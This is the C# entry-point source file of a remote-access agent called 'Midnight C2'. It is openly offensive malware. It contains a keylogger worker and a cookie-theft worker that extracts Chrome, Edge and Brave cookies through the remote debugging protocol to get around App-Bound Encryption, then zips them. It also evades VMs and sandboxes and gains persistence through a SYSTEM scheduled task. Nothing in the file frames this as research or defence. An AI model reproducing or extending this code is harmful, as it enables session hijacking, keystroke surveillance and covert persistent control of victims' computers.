using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MidnightAgent.Core;
using MidnightAgent.Installation;
using MidnightAgent.Security;
using MidnightAgent.Utils;

namespace MidnightAgent
{
    static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            // Worker Mode (for cookies / user context tasks)
            if (args.Length >= 2 && args[0] == "--cookie-worker")
            {
                RunCookieWorker(args[1]);
                return;
            }
            else if (args.Length >= 2 && args[0] == "--keylogger-worker")
            {
                KeyloggerWorker.Run(args[1]);
                return;
            }

            // Normal Agent Mode
            using (var mutex = new Mutex(true, "MidnightAgent_Mutex", out bool isNew))
            {
                if (!isNew)
                {
                    return; // Already running
                }

                try
                {
                    // Set Agent Process Priority to Realtime
                    using (var currentProcess = System.Diagnostics.Process.GetCurrentProcess())
                    {
                        currentProcess.PriorityClass = System.Diagnostics.ProcessPriorityClass.RealTime;
                    }
                }
                catch (Exception prioEx)
                {
                    System.Diagnostics.Debug.WriteLine($"Priority Warning: {prioEx.Message}");
                }

                try
                {
                    // Security checks (VM and Sandbox detection)
                    if (!Config.BypassSecurityChecks)
                    {
                        if (VMDetection.IsVM() || SandboxDetection.IsSandbox())
                        {
                            return;
                        }
                    }

                    // Check privileges
                    bool isAdmin = PrivilegeHelper.IsAdmin();
                    bool isSystem = PrivilegeHelper.IsSystem();
                    bool isInstalled = Installer.IsInstalled();

                    System.Diagnostics.Debug.WriteLine($"Admin: {isAdmin}, SYSTEM: {isSystem}, Installed: {isInstalled}");

                    // If running as Admin (not SYSTEM), handle installation
                    if (isAdmin && !isSystem)
                    {
                        if (isInstalled)
                        {
                            Installer.Uninstall();
                            Thread.Sleep(2000);
                        }
                        
                        bool installed = Installer.Install();
                        if (installed)
                        {
                            MessageBox.Show("✅ Installed successfully (SYSTEM Task)", "Midnight C2", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show("❌ Installation failed", "Midnight C2", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                        return;
                    }

                    // Run Agent
                    Agent agent = new Agent();
                    agent.Run();
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Error: {ex.Message}");
                }
            }
        }

        static void RunCookieWorker(string zipPath)
        {
            string debugLog = Path.Combine(Path.GetTempPath(), "cookie_debug.log");
            File.WriteAllText(debugLog, $"Worker started at {DateTime.Now}\n");

            try
            {
                string tempDir = Path.Combine(Path.GetTempPath(), $"cookies_{Guid.NewGuid():N}");
                Directory.CreateDirectory(tempDir);

                StringBuilder debug = new StringBuilder();
                
                // Use Remote Debugging Protocol to bypass v20 App-Bound Encryption
                File.AppendAllText(debugLog, "Using Remote Debugging Protocol...\n");
                
                // Extract from Chrome
                ExtractViaDebugger("chrome", "Chrome", tempDir, debugLog);
                
                // Extract from Edge
                ExtractViaDebugger("edge", "Edge", tempDir, debugLog);
                
                // Extract from Brave
                ExtractViaDebugger("brave", "Brave", tempDir, debugLog);

                // Copy log to temp dir
                File.AppendAllText(debugLog, "Zipping results...\n");
                File.Copy(debugLog, Path.Combine(tempDir, "debug.log"));

                // Zip results
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(tempDir, zipPath);

                // Cleanup
                try { Directory.Delete(tempDir, true); } catch { }
            }
            catch (Exception ex)
            {
                File.AppendAllText(debugLog, $"Critical Error: {ex}\n"); 
            }
        }

        static void ExtractViaDebugger(string browserName, string displayName, string outputDir, string logFile)
        {
            try
            {
                File.AppendAllText(logFile, $"Extracting {displayName} via Remote Debug...\n");
                
                StringBuilder debug = new StringBuilder();
                string result = RemoteDebugger.ExtractCookies(browserName, debug);
                
                // Log debug info
                if (debug.Length > 0)
                {
                    File.AppendAllText(logFile, $"[{displayName} Debug]\n{debug}\n");
                }
                
                if (!string.IsNullOrEmpty(result) && !result.StartsWith("Error"))
                {
                    File.WriteAllText(Path.Combine(outputDir, $"{displayName}_cookies.txt"), result);
                    File.AppendAllText(logFile, $"Success! {result.Split('\n').Length} cookies.\n");
                }
                else
                {
                    File.AppendAllText(logFile, $"{displayName} Result: {result}\n");
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText(logFile, $"Error extracting {displayName}: {ex.Message}\n");
            }
        }
    }
}
